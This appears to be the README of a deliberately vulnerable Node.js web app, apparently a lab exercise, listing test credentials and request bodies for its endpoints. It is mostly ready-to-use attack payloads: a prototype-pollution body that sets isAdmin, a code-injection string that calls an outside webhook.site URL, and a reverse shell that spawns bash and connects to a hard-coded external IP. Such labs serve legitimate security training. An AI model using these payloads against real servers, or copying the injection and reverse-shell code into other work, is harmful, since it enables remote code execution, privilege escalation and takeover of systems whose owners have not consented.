# Vulnerable Web App

This app is vulnerable to prototype pollution and code execution.

# Login

http://localhost:3000/login

```
{
	"username": "test",
	"password": "test"
}
```

# Prototype Pollution

http://localhost:3000/send-request

```
{
	"app": "my-super-app",
	"constructor": {"prototype": {"isAdmin": true}}
}
```

# Code Execution

http://localhost:3000/send-request-formatted

Web Request
```
{
	"app": "){global.process.mainModule.require('https').get('https://webhook.site/a7b90588-7255-45f2-8912-3d2f8f4e1d33');}; with(obj"
}
```

or

Reverse shell
```
{
	"app": "){!async function(){var n=global.process.mainModule.require('net'),e=global.process.mainModule.require('child_process').spawn('bash',[]),t=new n.Socket;t.connect(9001,'83.136.250.34',function(){t.pipe(e.stdin),e.stdout.pipe(t),e.stderr.pipe(t)})}();}; with(obj"
}
```
